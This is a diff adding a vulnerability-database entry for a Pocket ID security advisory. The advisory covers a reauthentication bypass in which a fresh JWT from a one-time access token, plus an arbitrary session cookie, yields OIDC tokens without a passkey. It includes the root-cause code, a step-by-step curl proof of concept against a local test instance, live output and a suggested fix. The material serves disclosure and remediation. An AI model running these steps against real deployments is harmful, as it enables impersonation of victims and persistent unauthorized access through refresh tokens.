@@ -1,0 +1,206 @@
+[basic]
+description = '''
+# Reauthentication Bypass via One-Time Access Token Login
+
+## Summary
+
+A weaker authentication method (OTA token or signup token) is accepted as passkey step-up proof, yielding unauthorized renewable 30-day OIDC refresh tokens for clients explicitly configured with `RequiresReauthentication: true`. The `POST /api/webauthn/reauthenticate` endpoint's access-token fallback checks only JWT freshness (`IssuedAt` within 60 seconds), not the authentication method used. The session cookie gate is also non-validating -- any arbitrary cookie value (e.g. `session=deadbeef`) is accepted, collapsing the reauth boundary to token recency alone.
+
+The bypass needs to succeed only once. The resulting OIDC grant includes a 30-day refresh token that can be rotated indefinitely, providing persistent victim-impersonation access to the protected downstream service. The attacker obtains `access_token` (1-hour TTL), `id_token` (victim's name, email, profile), and `refresh_token` (30-day TTL, renewable) for a client that was explicitly configured to require passkey step-up authentication. The attacker can perform victim-scoped actions at the downstream relying party indefinitely.
+
+## Root Cause
+
+`CreateReauthenticationTokenWithAccessToken` (webauthn_service.go:362-403) only checks that the access token's `IssuedAt` claim is less than 60 seconds old:
+
+```go
+// webauthn_service.go:378-381
+tokenExpiration, ok := token.IssuedAt()
+if !ok || time.Since(tokenExpiration) > time.Minute {
+    return \"\", &common.ReauthenticationRequiredError{}
+}
+```
+
+It does not check HOW the user originally authenticated. The `reauthenticateHandler` (webauthn_controller.go:179-207) falls into this path whenever the request body cannot be parsed as a WebAuthn credential assertion:
+
+```go
+// webauthn_controller.go:189-199
+credentialAssertionData, err := protocol.ParseCredentialRequestResponseBody(c.Request.Body)
+if err == nil {
+    token, err = wc.webAuthnService.CreateReauthenticationTokenWithWebauthn(...)
+} else {
+    // FALLBACK: Only checks access token age, not auth method
+    accessToken, _ := c.Cookie(cookie.AccessTokenCookieName)
+    token, err = wc.webAuthnService.CreateReauthenticationTokenWithAccessToken(c.Request.Context(), accessToken)
+}
+```
+
+Additionally, the handler's session cookie check (line 180) only verifies that a cookie named `session` exists -- it does not validate the cookie value against any server-side session store. Any arbitrary value (e.g. `session=deadbeef`) satisfies the check:
+
+```go
+// webauthn_controller.go:180-184
+sessionID, err := c.Cookie(cookie.SessionIdCookieName)
+if err != nil {
+    _ = c.Error(&common.MissingSessionIdError{})
+    return
+}
+// sessionID is passed to CreateReauthenticationTokenWithWebauthn but NOT
+// to CreateReauthenticationTokenWithAccessToken (the fallback path)
+```
+
+In the fallback path, the `sessionID` variable is never used. The session cookie is a gate check only -- presence, not validity. This means the reauth boundary is not bound to a real authenticated browser session.
+
+Meanwhile, `GenerateAccessToken` (jwt_service.go:190-195) always sets `IssuedAt(now)` regardless of how authentication was performed:
+
+```go
+// jwt_service.go:191-195
+now := time.Now()
+token, err := jwt.NewBuilder().
+    Subject(user.ID).
+    Expiration(now.Add(...)).
+    IssuedAt(now).  // Always \"now\" — regardless of auth method
+```
+
+This function is called by:
+1. WebAuthn login (intended passkey path)
+2. One-time access token exchange (one_time_access_service.go:200)
+3. User signup (user_signup_controller.go:182)
+
+All three produce tokens that bypass the reauthentication freshness check.
+
+## Attack Chain
+
+**Precondition**: An OIDC client has `RequiresReauthentication: true`. The attacker has obtained a one-time access token (via email compromise, admin-issued token, or if unauthenticated OTP emails are enabled).
+
+1. **Exchange OTA for fresh JWT**: `POST /api/one-time-access-token/{token}` returns a fresh access token with `IssuedAt = now`.
+
+2. **Set any session cookie**: The handler checks for cookie existence only. Set `session=deadbeef` (or any arbitrary value). No need to call `/api/webauthn/login/start`.
+
+3. **Bypass reauthentication**: `POST /api/webauthn/reauthenticate` with empty body `{}` and the fake session cookie. WebAuthn parsing fails, falls to the access-token freshness check. Since the token was just issued, the check passes. The session cookie value is not validated in this path. A reauthentication token is returned without any passkey interaction.
+
+4. **Authorize sensitive client**: `POST /api/oidc/authorize` with the reauthentication token and the target client's ID. The authorization code is issued.
+
+5. **Get OIDC tokens**: `POST /api/oidc/token` exchanges the authorization code for access_token, id_token, and refresh_token.
+
+All steps complete in under 2 seconds (60-second window is trivial for scripts).
+
+## Proof of Concept (Verified Live)
+
+Tested against Pocket ID HEAD (626adbf) running in Docker with e2etest build.
+
+```bash
+# Seed test database
+curl -s -X POST http://localhost:1411/api/test/reset?skip-ldap=true
+
+# Exchange OTA for admin user (seeded token: HPe6k6uiDRRVuAQV)
+curl -s -c cookies.txt -X POST http://localhost:1411/api/one-time-access-token/HPe6k6uiDRRVuAQV
+# Returns 200 with user info, sets access_token cookie with IssuedAt=now
+
+# Bypass reauthentication - empty body triggers access token fallback
+# Session cookie can be ANY arbitrary value - handler only checks existence
+curl -s -b cookies.txt -b \"session=deadbeef\" -X POST http://localhost:1411/api/webauthn/reauthenticate \
+  -H \"Content-Type: application/json\" -d '{}'
+# Returns: {\"reauthenticationToken\":\"al9JkF9kVI0V3UsAqMJIIF73N4ogHial\"}
+# NO passkey interaction! Fake session cookie accepted!
+
+# Authorize sensitive OIDC client (after enabling RequiresReauthentication)
+curl -s -b cookies.txt -X POST http://localhost:1411/api/oidc/authorize \
+  -H \"Content-Type: application/json\" \
+  -d '{\"clientID\":\"3654a746-...\",\"scope\":\"openid profile email\",
+       \"callbackURL\":\"http://nextcloud/auth/callback\",
+       \"reauthenticationToken\":\"MUslJS8ALHDtSIiXGadS3yNiqTrA33q7\"}'
+# Returns: {\"code\":\"J31ZkpanMECULmBrToYmEuG3YiZrqvJ3\",\"callbackURL\":\"...\"}
+# OIDC authorization code issued without passkey!
+
+# Exchange for full OIDC token set
+curl -s -X POST http://localhost:1411/api/oidc/token \
+  -d \"grant_type=authorization_code&code=J31Zkp...&client_id=3654a746-...\"
+# Returns: access_token, id_token, refresh_token
+```
+
+**Live output from the test run:**
+```
+[A3] Bypass reauthentication (empty body -> access token fallback)...
+Reauth token (no passkey used): MUslJS8ALHDtSIiXGadS3yNiqTrA33q7
+[A4] Authorize Nextcloud (requiresReauthentication=true)...
+Authorize response: {\"code\":\"J31ZkpanMECULmBrToYmEuG3YiZrqvJ3\",\"callbackURL\":\"http://nextcloud/auth/callback\",\"issuer\":\"http://localhost:1411\"}
+[A5] Exchange authorization code for OIDC tokens...
+Token response keys: ['access_token', 'token_type', 'id_token', 'refresh_token', 'expires_in']
+=== FULL CHAIN COMPLETE ===
+```
+
+## Impact
+
+The `RequiresReauthentication` feature on OIDC clients is designed to enforce step-up authentication via passkeys for sensitive downstream services. This bypass completely defeats that protection and yields persistent access:
+
+- **Unauthorized victim-scoped downstream access**: The attacker receives a valid OIDC grant (access_token, id_token, refresh_token) for a client the admin explicitly protected with passkey reauthentication. The attacker can impersonate the victim at the downstream relying party and perform victim-scoped actions (read data, modify settings, access protected resources) -- this is not just information disclosure but active impersonation.
+- **Persistent access via refresh token**: The bypass needs to succeed only once (within 60 seconds of OTA exchange). The 30-day refresh token can be rotated indefinitely. Tested and confirmed: after 65 seconds (past the reauth window), the refresh token still produces new access tokens and userinfo access.
+- **Collapsed security boundary**: The passkey reauthentication requirement degenerates to two non-security-relevant checks: (1) JWT `IssuedAt` recency (satisfied by any login method) and (2) session cookie existence (satisfied by any arbitrary cookie value). Neither check verifies that a passkey ceremony occurred.
+- **Email compromise escalation**: An attacker who gains access to a user's email can trigger and intercept a one-time access token, then authorize any OIDC client including those the admin explicitly protected with passkey reauthentication.
+- **Downstream service exposure**: OIDC clients protected by reauthentication typically guard sensitive services (admin panels, CI/CD, infrastructure access). The bypass grants full OIDC tokens including access_token (1h TTL), id_token (with victim's name, email, profile), and refresh_token (30-day TTL, renewable).
+
+**Scope**: The bypass affects OIDC client authorization (the sole consumer of reauthentication tokens). Other sensitive operations (WebAuthn credential management, user profile changes, admin operations) do not use reauthentication tokens.
+
+**Escalation vectors investigated and ruled out**:
+- Non-admin privilege escalation: tested live, non-admin users get 403 on admin endpoints (OIDC client modification, OTA creation for other users). No middleware confusion.
+- IDOR in OTA minting: all OTA creation endpoints properly enforce admin auth or are self-service only. No cross-user forgery.
+- OTA replay: OTA tokens are properly single-use (deleted from DB on exchange).
+
+## Suggested Fix
+
+The access-token fallback in `CreateReauthenticationTokenWithAccessToken` should verify that the session was established via a strong authentication method (passkey/WebAuthn), not just that the access token is fresh.
+
+**Option 1 (simplest)**: Remove the access-token fallback entirely. Always require a WebAuthn ceremony for reauthentication.
+
+**Option 2**: Add an `auth_method` claim to the access token when generated via passkey login. The reauthentication fallback should only succeed for tokens with `auth_method: \"webauthn\"`.
+
+```go
+// In GenerateAccessToken, add auth method context
+func (s *JwtService) GenerateAccessToken(user model.User, authMethod string) (string, error) {
+    // ... existing code ...
+    // Add auth_method claim
+}
+
+// In CreateReauthenticationTokenWithAccessToken, check auth method
+func (s *WebAuthnService) CreateReauthenticationTokenWithAccessToken(...) (string, error) {
+    // ... existing verification ...
+    authMethod, _ := token.Get(\"auth_method\")
+    if authMethod != \"webauthn\" {
+        return \"\", &common.ReauthenticationRequiredError{}
+    }
+    // ... rest of function ...
+}
+```
+
+## Self-Review
+
+- **Is this by-design?** No. The 60-second freshness window was designed for UX after passkey login (avoid immediate re-prompt). But it accepts any fresh token, not just passkey-authenticated ones. The `RequiresReauthentication` feature clearly intends to enforce passkey interaction.
+- **Are there upstream bounds?** No. The only check is `IssuedAt` freshness. All login methods produce equivalent tokens.
+- **Honest weaknesses**: Requires obtaining a one-time access token (email interception or admin-issued). The 60-second window is tight for manual exploitation but trivial for scripts. Impact is limited to OIDC client authorization. The non-validating session cookie weakens the boundary but does not change the fundamental precondition (needing a fresh JWT).
+- **Existing reports**: No prior reports for this issue. CVE-2026-28512 and CVE-2026-28513 are unrelated.
+- **Prior art**: No competing reports found on GitHub issues, security advisories, or huntr.
+
+
+Koda Reef
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Pocket ID has a reauthentication bypass via one-time access token login — passkey step-up requirement defeated by JWT freshness check that accepts any login method"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-hp74-gm6m-2qm5"]
+ave_id = "AVE-2026-1134"
+
+[meta]
+collected_at = "2026-08-06T06:28:26.968278849+00:00"
+status = "completed"
+
+[references]
+urls = []
